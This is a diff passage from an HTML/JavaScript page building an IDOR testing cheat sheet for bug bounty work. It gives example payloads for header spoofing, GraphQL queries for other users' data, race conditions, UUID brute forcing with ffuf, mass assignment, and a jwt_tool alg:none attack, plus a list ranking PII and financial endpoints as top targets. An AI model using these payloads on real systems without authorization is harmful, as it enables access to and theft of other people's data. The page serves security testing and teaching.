+      { variant: "Unicode", desc: "Fullwidth digits", example: '/api/users/９  (U+FF19)' },
+    ]
+  },
+  {
+    id: 9, label: "Advanced", fullLabel: "Advanced Techniques",
+    tag: "Advanced", tagClass: "tag-advanced",
+    info: "Higher complexity techniques requiring more setup — but often yield the most impactful findings.",
+    techniques: [
+      { title: "X-Forwarded-For / IP-based bypass", risk: "medium", riskLabel: "Medium",
+        desc: "Some APIs restrict access by IP. Spoof trusted internal IPs via proxy headers.",
+        code: `X-Forwarded-For: 127.0.0.1\nX-Real-IP: 10.0.0.1\nX-Originating-IP: 192.168.1.1\nX-Remote-IP: 172.16.0.1` },
+      { title: "X-Original-URL header bypass", risk: "medium", riskLabel: "Medium",
+        desc: "Some reverse proxies honor X-Original-URL or X-Rewrite-URL to override the request path.",
+        code: `GET /api/public\nX-Original-URL: /api/admin/users\n\n# Also try:\nX-Rewrite-URL: /api/admin/users` },
+      { title: "Blind IDOR monitoring", risk: "high", riskLabel: "High",
+        desc: "IDOR that doesn't return visible data — instead triggers backend actions. Monitor attacker's email/inbox for victim data.",
+        code: `# Request that sends email to another user:\nPOST /api/export?user_id=9\n# → victim receives export request notification?\n# → Or attacker receives victim's export?` },
+      { title: "GraphQL IDOR", risk: "critical", riskLabel: "Critical",
+        desc: "GraphQL resolvers often lack fine-grained auth. Substitute IDs in queries and mutations.",
+        code: `# Query another user:\nquery { user(id: 9) { email password } }\n\n# Mutation on victim's data:\nmutation { deletePost(id: 999) }\n\n# Introspection to find types:\n{ __schema { types { name } } }` },
+      { title: "TOCTOU / race condition IDOR", risk: "high", riskLabel: "High",
+        desc: "Race condition between auth check and action. Send concurrent requests — one valid, one invalid — to exploit brief authorization gaps.",
+        code: `# Turbo Intruder (Burp):\n# Send 50 concurrent requests:\nfor i in range(50):\n    engine.queue(target.req, str(victim_id))\n\n# Or: last-write-wins race` },
+      { title: "Weak UUID / partial brute force", risk: "medium", riskLabel: "Medium",
+        desc: "If UUIDs share a common prefix or suffix pattern, brute force the variable segment.",
+        code: `# Observed UUIDs:\nusr-2024-00001a\nusr-2024-000021\n# Pattern: usr-2024-XXXXXX\n# Brute: ffuf -w hex4.txt \\\n#   -u /api/user/usr-2024-FUZZ` },
+      { title: "SSRF-chained IDOR", risk: "high", riskLabel: "High", isNew: true,
+        desc: "Combine SSRF with IDOR — use a URL parameter that fetches internal resources to access objects behind auth.",
+        code: `# SSRF endpoint that fetches data:\nPOST /api/webhook\n{"url": "http://internal/api/user/9"}\n\n# Chains with IDOR to reach\n# internal-only resources` },
+      { title: "Mass assignment IDOR", risk: "critical", riskLabel: "Critical", isNew: true,
+        desc: "Frameworks that auto-bind request fields to model properties. Send extra fields like user_id, owner_id in create/update requests.",
+        code: `# Create a resource, add owner_id:\nPOST /api/orders\n{\n  "item": "laptop",\n  "user_id": 9,      # set victim as owner\n  "account_id": 9\n}` },
+    ]
+  },
+  {
+    id: 10, label: "Automation", fullLabel: "Enumeration & Automation",
+    tag: "Automation", tagClass: "tag-automation",
+    info: "Tools and recipes for automating IDOR discovery at scale.",
+    isTools: true,
+    tools: [
+      { name: "ffuf", desc: "Fast web fuzzer — enumerate sequential IDs or UUIDs at speed.", cmd: "ffuf -u https://target/api/user/FUZZ \\\n  -w ids.txt \\\n  -H \"Authorization: Bearer TOKEN\" \\\n  -fc 403,404 -mc 200 \\\n  -o results.json" },
+      { name: "Turbo Intruder", desc: "Burp Suite plugin for high-speed intruder attacks — ideal for race conditions and large ID ranges.", cmd: "# In Burp: right-click request\n# Extensions → Turbo Intruder\n# Select race_single_packet_attack.py\n# Set numeric range in script" },
+      { name: "Arjun", desc: "HTTP parameter discovery tool — finds hidden query/body params that accept IDs.", cmd: "arjun -u https://target/api/messages\n# Finds hidden params like:\n# ?user_id= ?account= ?uid=" },
+      { name: "ParamMiner", desc: "Burp extension — mines hidden parameters from responses and JS files.", cmd: "# Burp → Extensions → ParamMiner\n# Right-click → Guess params\n# Checks headers, body, query" },
+      { name: "grpcurl", desc: "Command-line tool for testing gRPC services — equivalent to curl for gRPC.", cmd: "grpcurl -plaintext \\\n  -d '{\"user_id\": 9}' \\\n  target.com:9090 \\\n  user.UserService/GetUser" },
+      { name: "jwt_tool", desc: "Test JWT token manipulation — modify sub/user_id claims without valid signature.", cmd: "python3 jwt_tool.py TOKEN \\\n  -T              # tamper mode\n  -pc user_id     # payload claim\n  -pv 9           # victim's ID value\n  -X a            # alg:none attack" },
+    ]
+  },
+  {
+    id: 11, label: "False Negatives", fullLabel: "Detecting False Negatives",
+    tag: "Recon", tagClass: "tag-recon",
+    info: "IDOR checks can return false negatives — appearing blocked when they aren't. Use this checklist to ensure thorough coverage.",
+    isChecklist: true,
+    items: [
+      "Compare response body and content-length, not just HTTP status code — 200 with empty body vs 200 with data.",
+      "Retry after logout/login cycle to bust server-side role/session cache.",
+      "Test every endpoint with multiple HTTP methods (GET, POST, PUT, DELETE, PATCH).",
+      "Test via web browser AND mobile app AND direct API calls — different codepaths.",
+      "Check if role restrictions are frontend-only by bypassing UI via proxy (Burp).",
+      "Test batch endpoints and multi-ID arrays — victim ID may leak among valid IDs.",
+      "Include WebSocket, gRPC, and SSE channels in your test scope.",
+      "Test unauthenticated requests — sometimes auth is completely missing.",
+      "Check error messages — 500 errors on victim IDs vs 404 on random IDs reveals existence.",
+      "Test both v1 and v2+ API endpoints for the same resource.",
+    ]
+  },
+  {
+    id: 12, label: "Priority", fullLabel: "Quick Prioritization Guide",
+    tag: "Recon", tagClass: "tag-recon",
+    info: "Order your testing by business impact — focus on highest-value targets first to maximize bounty potential.",
+    isPriority: true,
+    items: [
+      { rank: "1", label: "Exposed PII / financial endpoints", detail: "SSNs, credit cards, bank accounts, payment history, invoices" },
+      { rank: "2", label: "Export / download / file endpoints", detail: "Bulk data exports, file downloads, backup access" },
+      { rank: "3", label: "Write / modify operations", detail: "PUT, PATCH, DELETE — can cause data loss or hijacking" },
+      { rank: "4", label: "Batch / multi-ID endpoints", detail: "High surface area, potential for mass data enumeration" },
+      { rank: "5", label: "GraphQL / mobile APIs / gRPC / WebSocket", detail: "Often less tested, weaker auth implementation" },
+      { rank: "6", label: "Predictable ID patterns / weak UUIDs", detail: "Integer sequences, timestamps, MD5 hashes" },
+    ]
+  }
+];
+
+// ===================== BUILD NAV =====================
+const navEl = document.getElementById('phaseNavInner');
+phases.forEach(p => {
+  const btn = document.createElement('button');
+  btn.className = 'phase-nav-btn';
+  btn.textContent = `P${p.id} ${p.label}`;
+  btn.dataset.id = p.id;
+  btn.onclick = () => {
+    document.getElementById(`phase-${p.id}`).scrollIntoView({ behavior: 'smooth' });
+  };
+  navEl.appendChild(btn);
+});
+
+// ===================== BUILD CONTENT =====================
+const mainEl = document.getElementById('mainContent');
+
+phases.forEach(p => {
+  const sec = document.createElement('section');
+  sec.className = 'phase-section';
+  sec.id = `phase-${p.id}`;
+
+  // Header
+  sec.innerHTML = `
+    <div class="phase-header">
+      <span class="phase-number">PHASE ${String(p.id).padStart(2,'0')}</span>
+      <h2 class="phase-title">${p.fullLabel}</h2>
+      <span class="phase-tag ${p.tagClass}">${p.tag}</span>
+    </div>
+    ${p.info ? `<div class="info-box"><strong>Overview:</strong> ${p.info}</div>` : ''}
+  `;
+
+  // PAYLOAD TABLE
+  if (p.isTable) {
+    const tbl = document.createElement('div');
+    tbl.style.background = 'var(--surface)';
+    tbl.style.border = '1px solid var(--border)';
+    tbl.style.borderRadius = '12px';
+    tbl.style.overflow = 'hidden';
+    tbl.innerHTML = `
+      <table class="payload-table">
+        <thead><tr>
+          <th>Variant</th>
+          <th>Description</th>
+          <th>Example Payload</th>
+        </tr></thead>
+        <tbody>
+          ${p.payloads.map(pl => `<tr>
+            <td>${pl.variant}</td>
+            <td style="color:var(--text2)">${pl.desc}</td>
+            <td>${pl.example}</td>
+          </tr>`).join('')}
+        </tbody>
+      </table>
+    `;
+    sec.appendChild(tbl);
+  }
+
+  // TOOLS
+  else if (p.isTools) {
+    const grid = document.createElement('div');
+    grid.className = 'tool-grid';
+    p.tools.forEach(t => {
+      const card = document.createElement('div');
+      card.className = 'tool-card';
+      card.innerHTML = `
+        <div class="tool-name">${t.name}</div>
+        <div class="tool-desc">${t.desc}</div>
+        <pre class="tool-cmd">${t.cmd}</pre>
+      `;
+      grid.appendChild(card);
+    });
+    sec.appendChild(grid);
+  }
+
+  // CHECKLIST
+  else if (p.isChecklist) {
+    const ul = document.createElement('ul');
+    ul.className = 'checklist';
+    p.items.forEach(item => {
+      const li = document.createElement('li');
+      li.textContent = item;
+      ul.appendChild(li);
+    });
+    const wrap = document.createElement('div');
+    wrap.style.background = 'var(--surface)';
+    wrap.style.border = '1px solid var(--border)';
+    wrap.style.borderRadius = '12px';
+    wrap.style.padding = '1rem 1.25rem';
+    wrap.appendChild(ul);
+    sec.appendChild(wrap);
+  }
+
+  // PRIORITY
+  else if (p.isPriority) {
+    const ul = document.createElement('ul');
+    ul.className = 'priority-list';
+    const rankColors = ['p1','p2','p3','p4','p5','p6'];
+    p.items.forEach((item, i) => {
+      const li = document.createElement('li');
+      li.className = 'priority-item';
+      li.innerHTML = `
+        <span class="priority-rank ${rankColors[i]}">#${item.rank}</span>
+        <div>
+          <div style="font-size:14px;font-weight:600;color:var(--text)">${item.label}</div>
+          <div style="font-size:12px;color:var(--text2);margin-top:2px">${item.detail}</div>
+        </div>
+      `;
+      ul.appendChild(li);
+    });
+    sec.appendChild(ul);
+  }
+
+  // TECHNIQUE CARDS
+  else if (p.techniques) {
+    const grid = document.createElement('div');
+    grid.className = 'cards-grid';
+    p.techniques.forEach(t => {
+      const card = document.createElement('div');
+      card.className = 'technique-card';
+      const accentMap = { critical: '#ff4d6d', high: '#ff964d', medium: '#f9c74f', low: '#43e97b', info: '#4cc9f0' };
+      card.style.setProperty('--card-accent', accentMap[t.risk] || '#6c63ff');
+      card.innerHTML = `
+        <div class="card-head">
+          <span class="card-risk risk-${t.risk}">${t.riskLabel}</span>
+          <span class="card-title">${t.title}${t.isNew ? '<span class="new-badge">New</span>' : ''}</span>
+          <span class="card-toggle">+</span>
+        </div>
+        <div class="card-body">
+          <p class="card-desc">${t.desc}</p>
+          <pre class="card-code">${t.code}</pre>
+        </div>
+      `;
+      card.querySelector('.card-head').onclick = () => {
+        card.classList.toggle('open');
+      };
+      grid.appendChild(card);
+    });
+    sec.appendChild(grid);
+  }
+
+  sec.appendChild(Object.assign(document.createElement('hr'), { className: 'divider' }));
+  mainEl.appendChild(sec);
+});
+
+// ===================== STICKY NAV HIGHLIGHT =====================
+const sections = document.querySelectorAll('.phase-section');
+const navBtns = document.querySelectorAll('.phase-nav-btn');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      const id = e.target.id.replace('phase-','');
+      navBtns.forEach(b => b.classList.toggle('active', b.dataset.id == id));
+    }
+  });
+}, { rootMargin: '-40% 0px -55% 0px' });
+sections.forEach(s => observer.observe(s));
+
+// ===================== 3D PARTICLE CANVAS =====================
+const canvas = document.getElementById('bg-canvas');
+const ctx = canvas.getContext('2d');
+let W, H, particles;
+
+function resize() {
+  W = canvas.width = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
+
+class Particle {
+  constructor() { this.reset(); }
+  reset() {
+    this.x = Math.random() * W;
+    this.y = Math.random() * H;
+    this.z = Math.random() * 2 + 0.2;
+    this.vx = (Math.random() - 0.5) * 0.3 * this.z;
+    this.vy = (Math.random() - 0.5) * 0.3 * this.z;
+    this.r = Math.random() * 1.5 + 0.4;
+    this.color = ['#6c63ff','#ff6584','#43e97b','#4cc9f0','#f9c74f'][Math.floor(Math.random()*5)];
+    this.alpha = Math.random() * 0.6 + 0.1;
+  }
+  update() {
+    this.x += this.vx; this.y += this.vy;
+    if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
+  }
+  draw() {
+    ctx.globalAlpha = this.alpha;
+    ctx.fillStyle = this.color;
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.r * this.z, 0, Math.PI * 2);
+    ctx.fill();
+  }
+}
+
+particles = Array.from({ length: 180 }, () => new Particle());
+
+function drawConnections() {
+  const maxDist = 100;
+  for (let i = 0; i < particles.length; i++) {
+    for (let j = i + 1; j < particles.length; j++) {
+      const dx = particles[i].x - particles[j].x;
+      const dy = particles[i].y - particles[j].y;
+      const d = Math.sqrt(dx*dx + dy*dy);
+      if (d < maxDist) {
+        ctx.globalAlpha = (1 - d/maxDist) * 0.08;
+        ctx.strokeStyle = '#6c63ff';
+        ctx.lineWidth = 0.5;
+        ctx.beginPath();
+        ctx.moveTo(particles[i].x, particles[i].y);
+        ctx.lineTo(particles[j].x, particles[j].y);
+        ctx.stroke();
+      }
+    }
+  }
+}
+
+function animate() {
+  ctx.clearRect(0, 0, W, H);
+  drawConnections();
+  particles.forEach(p => { p.update(); p.draw(); });
+  ctx.globalAlpha = 1;
+  requestAnimationFrame(animate);
+}
+animate();
+</script>
+</body>
+</html>
